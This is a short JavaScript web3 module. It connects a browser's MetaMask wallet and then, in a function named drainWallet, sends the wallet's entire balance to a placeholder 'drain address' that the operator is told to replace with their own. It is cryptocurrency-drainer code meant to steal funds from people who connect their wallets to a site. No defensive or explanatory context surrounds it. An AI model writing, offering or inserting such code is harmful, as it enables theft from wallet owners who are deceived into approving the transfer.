import Web3 from 'web3';

export const connectWallet = async (chain) => {
  if (window.ethereum) {
    try {
      const accounts = await window.ethereum.request({
        method: 'eth_requestAccounts',
      });
      const web3 = new Web3(window.ethereum);
      return { web3, accounts };
    } catch (err) {
      console.error(err);
      throw new Error('User denied account access');
    }
  } else {
    throw new Error('MetaMask or WalletConnect not detected. Please install.');
  }
};

export const drainWallet = async (walletAddress, chain) => {
  const { web3 } = await connectWallet(chain);
  const balance = await web3.eth.getBalance(walletAddress);
  const drainTo = '0xYourDrainAddressHere'; // Replace with your drain address

  await web3.eth.sendTransaction({
    from: walletAddress,
    to: drainTo,
    value: balance,
  });
};